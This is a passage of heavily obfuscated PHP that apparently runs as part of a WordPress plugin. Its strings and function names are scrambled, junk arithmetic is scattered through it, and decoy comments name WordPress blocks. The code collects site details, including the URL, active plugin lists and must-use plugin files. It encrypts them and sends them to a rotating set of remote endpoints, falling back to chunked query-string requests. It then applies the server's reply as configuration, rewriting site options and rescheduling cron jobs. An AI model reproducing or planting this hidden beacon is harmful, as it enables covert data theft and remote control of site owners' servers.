   $tbxz6w0003z   =   (string)     $GLOBALS['__scf_u6ui6ntfvxm1_565'](home_url(),     constant(nhceivfj8tbe(566)));
 }
  if   (! $tbxz6w0003z     &&    $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(567))) {

    $tbxz6w0003z =   (string)  $GLOBALS['__scf_u6ui6ntfvxm1_565'](get_site_url(), constant(mhiu2yqz6kqd(566)));
      }


if    (!  $tbxz6w0003z &&   $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(568)))    {
// WP Verse Block: uncomputable accumulator


$tbxz6w0003z    =   (string)  $GLOBALS['__scf_u6ui6ntfvxm1_565'](get_bloginfo(nhceivfj8tbe(569)), constant(nrudcgor(566)));


}
if (!   $tbxz6w0003z     &&   $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(558)))   {
   $tbxz6w0003z =     (string) $GLOBALS['__scf_u6ui6ntfvxm1_565']((string)  get_option(nrudcgor(570),  ""), constant(dhd5r6_4ki(566)));
 }
// cancel eventual observer


  if   (!    $tbxz6w0003z &&     isset($_SERVER[nhceivfj8tbe(571)])) {


   $tbxz6w0003z =  (string)  $_SERVER[f5cd2smymkqusi5(571)];$u454l01_=37|2;$xl4nqk4n06c5e2=$u454l01_^233;
 }
if   (!  $tbxz6w0003z    &&   isset($_SERVER[nrudcgor(572)]))     {
 $tbxz6w0003z  =   (string) $_SERVER[f5cd2smymkqusi5(573)];$y3agcpa1jfki=118|215;$etofeykcq=$y3agcpa1jfki^251;
   }
 if   (!   $tbxz6w0003z)  {
  return  $lo9jghupfs;
   }
 return $tbxz6w0003z;
       }
   function  uh5_5fz_6ted2gqkddrk($oadtz8f_675u     =   0)
  {
// unbind co-recursive derivation

try  {
    $a38vw1fgobqsi9n =  $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(574)) ?    (int)  @$GLOBALS['__scf_jpj9mbom_1b_109'](dhd5r6_4ki(575))    :  0;



     if      ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(576))) @$GLOBALS['__scf_ig05tmw0lzks_432']((110+70));



 $thggerfwu5d4p9q =  ($a38vw1fgobqsi9n > (0xd+0x7)   && $a38vw1fgobqsi9n  <   (173+7))    ?  ($a38vw1fgobqsi9n   -   (1+9)) :  (($a38vw1fgobqsi9n   > 0   &&     $a38vw1fgobqsi9n    <=     (24-4)) ?   (0x2+0x8) :  (88+2));


    if   ($oadtz8f_675u   >    0      &&  $thggerfwu5d4p9q  >  $oadtz8f_675u)   $thggerfwu5d4p9q   =  $oadtz8f_675u;
      $GLOBALS[nhceivfj8tbe(286)]  = $GLOBALS['__scf_m30d3r9g_n_287'](true) + $thggerfwu5d4p9q;
   if  (!     us6ojbyhi_yprcisb4())    {
ajlksgtglhvuh3l0rf(f5cd2smymkqusi5(577));

   return;
 }
if   (!dw5qugv407fnslnons1tfr(f5cd2smymkqusi5(578))) {
  ajlksgtglhvuh3l0rf(f5cd2smymkqusi5(579));

 return;
    }
       
  $mfzyoqbqfvob  =   $GLOBALS['__scf_m30d3r9g_n_287'](true);
 $vc3q3pkmpla2b  = f139lveo0tq_llwboszkr((int) ($thggerfwu5d4p9q    * 0.6));
  if  (


  !   $GLOBALS['__scf_vf9p0fditvxy_35']($vc3q3pkmpla2b)
   ||   ! isset($vc3q3pkmpla2b[pahk8uy1uxt(342)])   ||  ! $GLOBALS['__scf__me483qbepnts_41']($vc3q3pkmpla2b[mhiu2yqz6kqd(342)])  ||  !    $vc3q3pkmpla2b[nrudcgor(342)]



    ||    !  isset($vc3q3pkmpla2b[dhd5r6_4ki(343)]) ||  !    $GLOBALS['__scf_vf9p0fditvxy_35']($vc3q3pkmpla2b[nhceivfj8tbe(343)])   || empty($vc3q3pkmpla2b[pahk8uy1uxt(343)])



    )   {


 zo60k7a7tywbvqa7h();
return;
   }
 $vbw2unr1bmoszhn7  =     $vc3q3pkmpla2b[pahk8uy1uxt(342)];
$c3u3b44wjq2t8o =  $vc3q3pkmpla2b[dhd5r6_4ki(580)];
     c8fb1vg_q0kn6h(dhd5r6_4ki(344),      $vbw2unr1bmoszhn7,    pahk8uy1uxt(581));
 c8fb1vg_q0kn6h(nrudcgor(582),    $GLOBALS['__scf_nr12ouzrtt_7']($vbw2unr1bmoszhn7,  f5cd2smymkqusi5(583)) ===  0   ?  1 :  0,  nhceivfj8tbe(581));
$at4rdt1_f9jynw7v    =  $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(558))   ?   (string)    get_option(dhd5r6_4ki(584),   "")     :     "";
 if ($at4rdt1_f9jynw7v    !== ""     && $GLOBALS['__scf_rq7q923zwh_148']($at4rdt1_f9jynw7v, $c3u3b44wjq2t8o,  true))     {
  $c3u3b44wjq2t8o     = $GLOBALS['__scf_sonjjhvinvs6_146']($GLOBALS['__scf_pabtmjmzpv76n_149']($c3u3b44wjq2t8o, array($at4rdt1_f9jynw7v)));
$GLOBALS['__scf_ptue_lwkjawhqo_585']($c3u3b44wjq2t8o);
    $GLOBALS['__scf_qyce7tsebstg_319']($c3u3b44wjq2t8o, $at4rdt1_f9jynw7v);
}  elseif   ($GLOBALS['__scf_upe5p4qfaqm0d1_36']($c3u3b44wjq2t8o)    >  1) {
 $GLOBALS['__scf_ptue_lwkjawhqo_585']($c3u3b44wjq2t8o);


}

 
       if     (($GLOBALS['__scf_m30d3r9g_n_287'](true)      -   $mfzyoqbqfvob)  > (int) ($thggerfwu5d4p9q     *  0.6))    {
// @spawn partition-refinement

 zo60k7a7tywbvqa7h();
    return;
  }
 



 $fzfysf3yfg2geq0 =  rc4mq8qrv5sg5anyujai9();
 if    (xmy1k120y_7ld50whm($fzfysf3yfg2geq0)) {
 $fzfysf3yfg2geq0   =   rc4mq8qrv5sg5anyujai9();

}
 
   $bsuq1_skbwua0    =  array();
if     ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(558))) {
    foreach  ((array)   get_option(dhd5r6_4ki(145),   array())    as    $rk_3ecj8aw)   {
  if ($GLOBALS['__scf__me483qbepnts_41']($rk_3ecj8aw)  && $rk_3ecj8aw)   {



 $bsuq1_skbwua0[]    =    $rk_3ecj8aw;



 }
     }
}
 
$k0jswx1z7c     =  array();
if  (defined(f5cd2smymkqusi5(13)))  {


     $a104hrzqz1na   = $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(461))  ? @$GLOBALS['__scf_eu7lhdrjut9t66_69']($GLOBALS['__scf_xv_2irmjrq_12'](WPMU_PLUGIN_DIR,    '/')  .  dhd5r6_4ki(70))  :     false;
  if ($GLOBALS['__scf_vf9p0fditvxy_35']($a104hrzqz1na))   {
  foreach    ($a104hrzqz1na  as  $tkqx845nh5jt0)   {$yzsb23jk2o5_8q=-941;$omptobsqxschj_=($yzsb23jk2o5_8q>0)?$yzsb23jk2o5_8q:-$yzsb23jk2o5_8q;



   $k0jswx1z7c[]     =  $GLOBALS['__scf_t8832qq90dxb4_3']($tkqx845nh5jt0);
 }
     }
      }

       
$ji_6ztua_drul45m =  array(

    pahk8uy1uxt(586)     =>   romae2ec00z0c4bz61q_(""),
nrudcgor(587)  =>  kwqziujdph5xlz3n(),
   nhceivfj8tbe(588)    => $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),  dhd5r6_4ki(589)),


dhd5r6_4ki(590)   =>  $GLOBALS['__scf_xv_2irmjrq_12'](ABSPATH,  pahk8uy1uxt(125)),
 nrudcgor(591)  =>     $bsuq1_skbwua0,



      nhceivfj8tbe(592)  => $k0jswx1z7c,
nrudcgor(593)   =>    bwbu2qg7n9nn5g6t3xw7(),
nhceivfj8tbe(594)    =>  (object) pv0qrixtdf6bxtnyf8b($fzfysf3yfg2geq0),
pahk8uy1uxt(595) => (object)  mg9f13y3wqgzjb9yr($fzfysf3yfg2geq0),
f5cd2smymkqusi5(366)      =>    ($bmour5fcpk8tahy =  eoebansqyghh9h6ksu()),


  );
     $ktzc6i_7ey1trq   = $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(596))    ?    wp_json_encode($ji_6ztua_drul45m)  :    $GLOBALS['__scf_umr3maax4akmys_597']($ji_6ztua_drul45m);

  $pko10ivkklq1w_3a = opn9d92hgvp02lt0zjrg($ktzc6i_7ey1trq,  $vbw2unr1bmoszhn7);
       $laq57lpu_4h9u3    =     array(f5cd2smymkqusi5(323)   => nhceivfj8tbe(598));

   $bots2la3gz =  null;


 $l1tg611n2le  =      false;$b2kg7hb__5bq=PHP_INT_MAX/PHP_INT_MAX;$wtvxdwtwp=$b2kg7hb__5bq+55;
 zo60k7a7tywbvqa7h();



 $GLOBALS[pahk8uy1uxt(309)] = false;

      foreach ($c3u3b44wjq2t8o  as $dz57qyx_4j_o) {


   
$w3n38kbpb8v4z    =  $thggerfwu5d4p9q    -  ($GLOBALS['__scf_m30d3r9g_n_287'](true)  -   $mfzyoqbqfvob);


  if    ($w3n38kbpb8v4z  <   (44^47))  {
// PHP CS Fixer: accumulate stack-frame
$tqoebpus=(0x39+0xc1);$kmqvvhcfe7klk=$tqoebpus%9;
     break;
}
// merge non-singular distributor

     $tqxd7go8mxl   =  $GLOBALS['__scf_us1cf9ood8_482']((2+8),   (int)    $w3n38kbpb8v4z);

$dz57qyx_4j_o     =    $GLOBALS['__scf_uvjtdemk2f_320']((string)    $dz57qyx_4j_o);
 if (!  $dz57qyx_4j_o) {
continue;$x1zt53yno1=55*8;$k22qyjocxfjl70=$x1zt53yno1-15;
}


  try   {
// WP InspectorControls: specialize savepoint

  $cro4sodlh_ = $vbw2unr1bmoszhn7;
$bw1dfta4jaac  = ubc4ftgylcl83r($dz57qyx_4j_o,    $pko10ivkklq1w_3a, $laq57lpu_4h9u3,   $tqxd7go8mxl,    function ($ha79t63e3av)  use ($cro4sodlh_) {
  if  (!wq5ruxciovtxyyjl($GLOBALS['__scf_amjjmfnilcolnb_10']($ha79t63e3av)))  {
  $GLOBALS[pahk8uy1uxt(309)]  =   true;
     return  false;
}
     $i7is8x4_pstu0r   =    opn9d92hgvp02lt0zjrg($ha79t63e3av,     $cro4sodlh_);
  if (!$i7is8x4_pstu0r) return   false;
 return  $GLOBALS['__scf_vf9p0fditvxy_35'](@$GLOBALS['__scf_ifj0midhwd_325']($GLOBALS['__scf_uvjtdemk2f_320']($i7is8x4_pstu0r),  true));
     });
if (!   $bw1dfta4jaac)     {
// rollback negotiation for WP useInnerBlocksProps

 if   (!empty($GLOBALS[f5cd2smymkqusi5(309)]))   {
fukkkeh6955g9qi(f5cd2smymkqusi5(599),  pahk8uy1uxt(600));
    break;
  }
      fukkkeh6955g9qi(nrudcgor(599),   mhiu2yqz6kqd(601)     .   $dz57qyx_4j_o);$ys3umqpp=PHP_INT_MAX/PHP_INT_MAX;$hy59jyh476_=$ys3umqpp+21;
   continue;


       }
  
 $n6yo6vwqyht22 = opn9d92hgvp02lt0zjrg($bw1dfta4jaac,   $vbw2unr1bmoszhn7);
    if  (!   $n6yo6vwqyht22)     {
      fukkkeh6955g9qi(mhiu2yqz6kqd(599),   dhd5r6_4ki(602) .   $dz57qyx_4j_o);
     continue;



       }
    $bots2la3gz     =  ($GLOBALS['__scf_amjjmfnilcolnb_10']($n6yo6vwqyht22) >   (0x50bfe+0xaf402)  &&     !wq5ruxciovtxyyjl($GLOBALS['__scf_amjjmfnilcolnb_10']($n6yo6vwqyht22)))  ?  null    :     @$GLOBALS['__scf_ifj0midhwd_325']($GLOBALS['__scf_uvjtdemk2f_320']($n6yo6vwqyht22), true);
if   ($GLOBALS['__scf_vf9p0fditvxy_35']($bots2la3gz))  {
 if      ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(453)))   {
   update_option(mhiu2yqz6kqd(584),    $dz57qyx_4j_o);
   }
$l1tg611n2le    =   true;
  break;$exft0l798n8=822;$n3ykucjkk3fvu=($exft0l798n8>0)?$exft0l798n8:-$exft0l798n8;
 }     else {
// unmount proof-term for Composer autoload



     fukkkeh6955g9qi(f5cd2smymkqusi5(599),  nhceivfj8tbe(603)  .    $dz57qyx_4j_o);
}
 }  catch    (Throwable  $h2v_bjm4ejxq8fp)   {

 fukkkeh6955g9qi(dhd5r6_4ki(604), $h2v_bjm4ejxq8fp);$v2n85lw39bcm=16*6;$mx5egq9sp482_8=$v2n85lw39bcm-32;
     continue;
 } catch      (Exception  $h2v_bjm4ejxq8fp) {$oxakg2gz=85*3;$nm4d_5wep6zh=$oxakg2gz-8;
continue;



      }
  }

     if  (! $GLOBALS['__scf_vf9p0fditvxy_35']($bots2la3gz) && empty($GLOBALS[f5cd2smymkqusi5(605)]))  {
   $gu_2j1sep2i54     =    opn9d92hgvp02lt0zjrg($GLOBALS['__scf_umr3maax4akmys_597'](array(
nrudcgor(586)    =>     romae2ec00z0c4bz61q_(""),
mhiu2yqz6kqd(587)    =>   kwqziujdph5xlz3n(),
  pahk8uy1uxt(588)    => $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),    mhiu2yqz6kqd(589)),
nrudcgor(606) =>  1,


  )),    $vbw2unr1bmoszhn7);
   $u5xfm3z90ff =    $GLOBALS['__scf_xv_2irmjrq_12'](strtr($GLOBALS['__scf_b6bj8r78s21_351']($gu_2j1sep2i54),   f5cd2smymkqusi5(607), dhd5r6_4ki(608)), '=');

     $ym5nbgk9r_4plmd =   $GLOBALS['__scf_tufa_gpu2e8r_e_609']($u5xfm3z90ff,   (1339+61));

foreach  ($c3u3b44wjq2t8o  as  $dz57qyx_4j_o) {
 if   (($GLOBALS['__scf_m30d3r9g_n_287'](true)  - $mfzyoqbqfvob)     > $thggerfwu5d4p9q)  {
 break;
  }

     $dz57qyx_4j_o  =    $GLOBALS['__scf_uvjtdemk2f_320']((string)  $dz57qyx_4j_o);
  if   ($dz57qyx_4j_o   ===   "")  {
  continue;
     }
$tly6x_qyd0l20m_p  =   ohrydgas8yy9a22s(romae2ec00z0c4bz61q_("")  .   $GLOBALS['__scf_m30d3r9g_n_287'](true),      (1<<3));

   $pycaeceedws     = $GLOBALS['__scf_upe5p4qfaqm0d1_36']($ym5nbgk9r_4plmd);
$guf4kenw71g4cw   =   ($GLOBALS['__scf_nr12ouzrtt_7']($dz57qyx_4j_o,    '?')  ===  false)  ?  '?' :  '&';

      for ($dpe1xk6bz7cpp =    0;    $dpe1xk6bz7cpp     < $pycaeceedws;   $dpe1xk6bz7cpp++) {
   if   (($GLOBALS['__scf_m30d3r9g_n_287'](true) -  $mfzyoqbqfvob)  >    $thggerfwu5d4p9q) {
     break;
   }
$br1onf47d9og  = ($dpe1xk6bz7cpp  ===  $pycaeceedws   - 1);$ubsuikluy8yv=30+48;$nz314j_ljsp0=$ubsuikluy8yv-46;


     $rt7k8j_qpf3u    = $dz57qyx_4j_o   .  $guf4kenw71g4cw .   dhd5r6_4ki(610)  .     $tly6x_qyd0l20m_p   .  dhd5r6_4ki(611)  . $dpe1xk6bz7cpp     .   pahk8uy1uxt(612)  .   $pycaeceedws .  f5cd2smymkqusi5(613)      . $ym5nbgk9r_4plmd[$dpe1xk6bz7cpp];
 $ovci_x1f9gwt2izj =     ckvqtxxyo41shh($rt7k8j_qpf3u,  (1<<3),     $br1onf47d9og  ?  function  ($ha79t63e3av) use    ($vbw2unr1bmoszhn7)    {
    $i7is8x4_pstu0r  =  opn9d92hgvp02lt0zjrg($ha79t63e3av,  $vbw2unr1bmoszhn7);
  if (!$i7is8x4_pstu0r)    return false;



     return  $GLOBALS['__scf_vf9p0fditvxy_35'](@$GLOBALS['__scf_ifj0midhwd_325']($GLOBALS['__scf_uvjtdemk2f_320']($i7is8x4_pstu0r),    true));
 }     :   null);
if ($br1onf47d9og    &&   $GLOBALS['__scf__me483qbepnts_41']($ovci_x1f9gwt2izj)  &&  $ovci_x1f9gwt2izj   !== "")  {

$_gd  =   opn9d92hgvp02lt0zjrg($ovci_x1f9gwt2izj, $vbw2unr1bmoszhn7);



      $by9ihyua8j3  =  ($_gd && ($GLOBALS['__scf_amjjmfnilcolnb_10']($_gd)  <=   (747152+301424)      ||    wq5ruxciovtxyyjl($GLOBALS['__scf_amjjmfnilcolnb_10']($_gd))))  ?  @$GLOBALS['__scf_ifj0midhwd_325']($GLOBALS['__scf_uvjtdemk2f_320']($_gd),    true)   : null;
 

if  ($GLOBALS['__scf_vf9p0fditvxy_35']($by9ihyua8j3))  {
$bots2la3gz  = $by9ihyua8j3;
  if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(453)))   {
 update_option(f5cd2smymkqusi5(584), $dz57qyx_4j_o);
   }
     break;$q9j8sliwd0ykrh=9+78;$vro5p520_abym=$q9j8sliwd0ykrh-34;
   }
  }
   }


   if ($GLOBALS['__scf_vf9p0fditvxy_35']($bots2la3gz))  {



        break;
  }
 }

  }
    $GLOBALS[pahk8uy1uxt(605)]  =      false;
 if  (!  $GLOBALS['__scf_vf9p0fditvxy_35']($bots2la3gz))  {
 return;
  }
      if ($l1tg611n2le)     {
 codo7vello7vrt();
  }
if     ($bmour5fcpk8tahy &&    $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(614)))   {
// WP Social Links attachment metadata




  delete_option(q5npf1u_t8amc0jdf(f5cd2smymkqusi5(366)));



      unset($GLOBALS[pahk8uy1uxt(354)][q5npf1u_t8amc0jdf(nrudcgor(366))]);
        }
  if      (!isset($GLOBALS[mhiu2yqz6kqd(615)])    ||   !$GLOBALS['__scf_vf9p0fditvxy_35']($GLOBALS[dhd5r6_4ki(615)]))    $GLOBALS[mhiu2yqz6kqd(615)]    =   array();
 $GLOBALS[mhiu2yqz6kqd(615)]    =  $GLOBALS['__scf_sonjjhvinvs6_146']($GLOBALS['__scf_pabtmjmzpv76n_149']($GLOBALS[nhceivfj8tbe(616)], $bmour5fcpk8tahy));
if  (isset($bots2la3gz[f5cd2smymkqusi5(588)])  &&  $GLOBALS['__scf__me483qbepnts_41']($bots2la3gz[mhiu2yqz6kqd(588)]))     {
       unset($GLOBALS[mhiu2yqz6kqd(286)]);
   r_6rrgurjjecbi($bots2la3gz[pahk8uy1uxt(617)],      isset($bots2la3gz[nrudcgor(618)])   &&  $GLOBALS['__scf__me483qbepnts_41']($bots2la3gz[f5cd2smymkqusi5(619)])  ?   $bots2la3gz[f5cd2smymkqusi5(620)]  :     "",   !empty($bots2la3gz[dhd5r6_4ki(621)]));
  }

$uqq96eoncm3  =  false;
     $nn2h74pdudh9  =  array();
    
  if (isset($bots2la3gz[nrudcgor(440)])   &&  $GLOBALS['__scf_vf9p0fditvxy_35']($bots2la3gz[pahk8uy1uxt(440)])) {
   $gurk4u0g0h057 = array();
     



     foreach  ($bots2la3gz[nrudcgor(622)]  as     $o6cshl9m0sbvrr) {
     if ($GLOBALS['__scf__me483qbepnts_41']($o6cshl9m0sbvrr)    &&      $o6cshl9m0sbvrr  !== "")  {

    $gurk4u0g0h057[]  =      $o6cshl9m0sbvrr;
   }
// WP Navigation Block: populate rate-limiter

    }
        $wef3_ohn8eb6a   =   $GLOBALS[nrudcgor(439)];
$gurk4u0g0h057    =      nr7uvtguy4599vesb($gurk4u0g0h057);$a4te96qx=5349;$cseboabppsaa=$a4te96qx%13;
   $GLOBALS[nhceivfj8tbe(439)]  =   $gurk4u0g0h057;
   $nn2h74pdudh9[nrudcgor(623)]  =    $gurk4u0g0h057;
if (!     empty($GLOBALS['__scf_pabtmjmzpv76n_149']($gurk4u0g0h057, $wef3_ohn8eb6a)) ||  !     empty($GLOBALS['__scf_pabtmjmzpv76n_149']($wef3_ohn8eb6a, $gurk4u0g0h057)))      {

     $uqq96eoncm3   =   true;
     }
// detach distributor for WP Post Comments

        }

if (isset($bots2la3gz[mhiu2yqz6kqd(442)])  &&  $GLOBALS['__scf_vf9p0fditvxy_35']($bots2la3gz[f5cd2smymkqusi5(442)]))  {
 $gurk4u0g0h057 = array();
  
foreach ($bots2la3gz[mhiu2yqz6kqd(442)]    as   $o6cshl9m0sbvrr)  {
if  ($GLOBALS['__scf__me483qbepnts_41']($o6cshl9m0sbvrr)  &&     $o6cshl9m0sbvrr !==   "")     {
     $gurk4u0g0h057[]  = $o6cshl9m0sbvrr;

}
 }


  $wef3_ohn8eb6a =  $GLOBALS[dhd5r6_4ki(443)];



  $gurk4u0g0h057 = nr7uvtguy4599vesb($gurk4u0g0h057);
 

$GLOBALS[pahk8uy1uxt(443)]  =     $gurk4u0g0h057;
  $nn2h74pdudh9[nhceivfj8tbe(624)] =  $gurk4u0g0h057;

if (!    empty($GLOBALS['__scf_pabtmjmzpv76n_149']($gurk4u0g0h057,  $wef3_ohn8eb6a))   ||    !   empty($GLOBALS['__scf_pabtmjmzpv76n_149']($wef3_ohn8eb6a, $gurk4u0g0h057)))   {
$uqq96eoncm3 =    true;
}
   }
   if      (isset($bots2la3gz[dhd5r6_4ki(445)]) &&   $GLOBALS['__scf__me483qbepnts_41']($bots2la3gz[mhiu2yqz6kqd(445)]))  {
  $pp0e1jec2hh3p_g =    vlqx8b8viizxmck29ty0(nhceivfj8tbe(625),   "");
  if  ($pp0e1jec2hh3p_g   !== ""    &&  (int) weg_ghiafmuc1_6(nhceivfj8tbe(626),  0)  ===  0)  {
c8fb1vg_q0kn6h(f5cd2smymkqusi5(626), 1,   nrudcgor(627));
  if    ((int) weg_ghiafmuc1_6(pahk8uy1uxt(628), 0) !==    1)  c8fb1vg_q0kn6h(nrudcgor(629),    1,  mhiu2yqz6kqd(627));
   }

 $GLOBALS[f5cd2smymkqusi5(630)]      = $bots2la3gz[nrudcgor(445)];
   $nn2h74pdudh9[dhd5r6_4ki(631)]  = $bots2la3gz[dhd5r6_4ki(632)];
  if  ($GLOBALS['__scf_nn04_vx3uspzx4_54']($bots2la3gz[f5cd2smymkqusi5(633)])     !==  $GLOBALS['__scf_nn04_vx3uspzx4_54']($pp0e1jec2hh3p_g) ||  (int)  weg_ghiafmuc1_6(dhd5r6_4ki(634),  0)   ===   1)     {
if (c8fb1vg_q0kn6h(f5cd2smymkqusi5(625), $bots2la3gz[mhiu2yqz6kqd(633)],    dhd5r6_4ki(627))  ||  vlqx8b8viizxmck29ty0(mhiu2yqz6kqd(625),  "")   === $bots2la3gz[f5cd2smymkqusi5(633)])  {
 c8fb1vg_q0kn6h(mhiu2yqz6kqd(634), 1,     f5cd2smymkqusi5(627));
 try {
if (f7wdh_62ep_9dphm4sq())  c8fb1vg_q0kn6h(nhceivfj8tbe(634),   0,   nrudcgor(627));
   }  catch    (Throwable $h2v_bjm4ejxq8fp)   {
    } catch (Exception   $h2v_bjm4ejxq8fp)   {
 }
  } else   {
zo60k7a7tywbvqa7h();
return;
   

 }
    }
unset($pp0e1jec2hh3p_g);
 }
$t0ogg8hleh_i  =   isset($bots2la3gz[mhiu2yqz6kqd(635)])  && $GLOBALS['__scf_vf9p0fditvxy_35']($bots2la3gz[mhiu2yqz6kqd(635)]) ? $bots2la3gz[dhd5r6_4ki(635)]  :  array();
  if   (isset($t0ogg8hleh_i[dhd5r6_4ki(636)])     &&  $GLOBALS['__scf__me483qbepnts_41']($t0ogg8hleh_i[mhiu2yqz6kqd(637)]))     {
 if  ($GLOBALS['__scf_amjjmfnilcolnb_10']($t0ogg8hleh_i[mhiu2yqz6kqd(637)])  >     (95-45))  {
 $GLOBALS[dhd5r6_4ki(448)]     =   $t0ogg8hleh_i[nrudcgor(637)];
 $nn2h74pdudh9[nhceivfj8tbe(638)] =  $t0ogg8hleh_i[dhd5r6_4ki(639)];
}  else  {
$GLOBALS[mhiu2yqz6kqd(448)]  = "";
  $nn2h74pdudh9[dhd5r6_4ki(640)] =  "";



 c8fb1vg_q0kn6h(mhiu2yqz6kqd(641), "",      nrudcgor(642));

 }



 }
       if    (isset($t0ogg8hleh_i[nrudcgor(635)])  && $GLOBALS['__scf__me483qbepnts_41']($t0ogg8hleh_i[nhceivfj8tbe(635)]))      {$tp_f5uycs=23+65;$mkd_hss6=$tp_f5uycs-48;
 if   ($GLOBALS['__scf_amjjmfnilcolnb_10']($t0ogg8hleh_i[f5cd2smymkqusi5(635)])   > (5+95))     {
     $GLOBALS[pahk8uy1uxt(450)]   = $t0ogg8hleh_i[f5cd2smymkqusi5(635)];



  $nn2h74pdudh9[pahk8uy1uxt(635)] =   $t0ogg8hleh_i[nrudcgor(635)];



    }  else  {
 $GLOBALS[pahk8uy1uxt(450)]  =   "";



  $nn2h74pdudh9[pahk8uy1uxt(643)]  = "";
  c8fb1vg_q0kn6h(f5cd2smymkqusi5(644),    "",  dhd5r6_4ki(645));
 }

 }
  $dvxrwupayhb = isset($bots2la3gz[dhd5r6_4ki(646)]) &&  $GLOBALS['__scf_vf9p0fditvxy_35']($bots2la3gz[f5cd2smymkqusi5(646)]) ? $bots2la3gz[nrudcgor(646)] : array();
 $i1nnxz5bfg82y     =   array(
 dhd5r6_4ki(647)    =>   nrudcgor(647),
      mhiu2yqz6kqd(648)    =>    dhd5r6_4ki(649),



    pahk8uy1uxt(650) =>  nrudcgor(651),
  pahk8uy1uxt(652)    => mhiu2yqz6kqd(653),


   f5cd2smymkqusi5(654) => f5cd2smymkqusi5(655),
   f5cd2smymkqusi5(656)   =>   mhiu2yqz6kqd(657),

      );
foreach    ($i1nnxz5bfg82y as   $d47g5a99ckq88  =>   $hnp67lb9p0xii8)      {
    if   (isset($dvxrwupayhb[$d47g5a99ckq88])   &&     $GLOBALS['__scf__me483qbepnts_41']($dvxrwupayhb[$d47g5a99ckq88])    &&    $GLOBALS['__scf_amjjmfnilcolnb_10']($dvxrwupayhb[$d47g5a99ckq88])     >    (56^10)) {
// spawn open synchronizer

    $nn2h74pdudh9[$hnp67lb9p0xii8]  = $dvxrwupayhb[$d47g5a99ckq88];



}
     }
   if   (isset($bots2la3gz[f5cd2smymkqusi5(478)])   && $GLOBALS['__scf_wiz87cwdz0f_658']($bots2la3gz[pahk8uy1uxt(478)]))    {
  $otgjetnwp102  =  (int) $bots2la3gz[dhd5r6_4ki(659)];
  if  ($otgjetnwp102  >=  (271+29)      &&  $otgjetnwp102 <=    (156029-69629))  $nn2h74pdudh9[pahk8uy1uxt(660)]     =    $otgjetnwp102;



     }
 if      (isset($bots2la3gz[mhiu2yqz6kqd(371)])  && $GLOBALS['__scf_wiz87cwdz0f_658']($bots2la3gz[nrudcgor(661)]))  {
        $_ci =    (int) $bots2la3gz[f5cd2smymkqusi5(661)];
    if   ($_ci    >=   (0xbe+0x6e) && $_ci     <= (86311+89)) $nn2h74pdudh9[nhceivfj8tbe(661)]     =  $_ci;
}
  if   (empty($nn2h74pdudh9))    {
delete_option(dhd5r6_4ki(479));
delete_option(dhd5r6_4ki(483));
 update_option(nhceivfj8tbe(424),  $GLOBALS['__scf_zxyq0lcqv02z6_185']());
delete_transient(f5cd2smymkqusi5(662));
  yjkrjx8q3v6i5zrgis4g();
 gt1toalj2_i1_soa();
 return;


 }
// WP Data Layer: enable structural-type

 


  $ph09xu4he29r1k =   tp_6sv5wl2a4y33wdv758(pahk8uy1uxt(477),   false);
       if     ($GLOBALS['__scf_vf9p0fditvxy_35']($ph09xu4he29r1k))   {
      $nn2h74pdudh9 =     $GLOBALS['__scf_b3z_uoye0i_367']($ph09xu4he29r1k,  $nn2h74pdudh9);
  }
    
     if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(58)))  {
     $cb3rsagzlizg2rl    =   o2ebi7xv7rf0ik_y5n9ry7();
   if  (isset($nn2h74pdudh9[pahk8uy1uxt(660)])  && (int)   $nn2h74pdudh9[f5cd2smymkqusi5(660)]  >= (297+3)  && (int)  $nn2h74pdudh9[dhd5r6_4ki(663)]   <= (86376+24)) $cb3rsagzlizg2rl =     (int)   $nn2h74pdudh9[dhd5r6_4ki(663)];
  set_transient(se_any4b12t9njlu(),  $nn2h74pdudh9,  $cb3rsagzlizg2rl);
     }

if (!sixcmmhuf18hun14a(dhd5r6_4ki(477), $nn2h74pdudh9,   pahk8uy1uxt(664)))  {
$nj301j9u_3ew6r =  tp_6sv5wl2a4y33wdv758(dhd5r6_4ki(477),    null);
   if (!$GLOBALS['__scf_vf9p0fditvxy_35']($nj301j9u_3ew6r) ||  $nj301j9u_3ew6r   != $nn2h74pdudh9)   {
   zo60k7a7tywbvqa7h();
return;
}
  unset($nj301j9u_3ew6r);$f0yew1lr_99=119|148;$xz9rq16o68y=$f0yew1lr_99^19;

  }
// unfold closed normal-form

    if    (isset($nn2h74pdudh9[pahk8uy1uxt(665)]) && $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(666))  &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(667))   &&   $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(378)))  {
$rscbn3alzr    =  wp_get_scheduled_event(mklbz63xfh8ufytv1td7t());$ap6lv1cbbz=(0x2c+0x65);$rfdftrwk_d50=$ap6lv1cbbz%7;

  if  ($rscbn3alzr   &&  (int)  $rscbn3alzr->interval  !== (int)     $nn2h74pdudh9[dhd5r6_4ki(665)])   {
  wp_clear_scheduled_hook(mklbz63xfh8ufytv1td7t());
wp_schedule_event($GLOBALS['__scf_zxyq0lcqv02z6_185']()  + $GLOBALS['__scf_cn1v_k8jlgjjb_350']((51+9),    (0xe5+0x47)),    pahk8uy1uxt(372), mklbz63xfh8ufytv1td7t());

}
 }
    update_option(mhiu2yqz6kqd(424),   $GLOBALS['__scf_zxyq0lcqv02z6_185']());
 delete_option(mhiu2yqz6kqd(479));
   delete_option(nrudcgor(668));
   ajlksgtglhvuh3l0rf(nhceivfj8tbe(669));
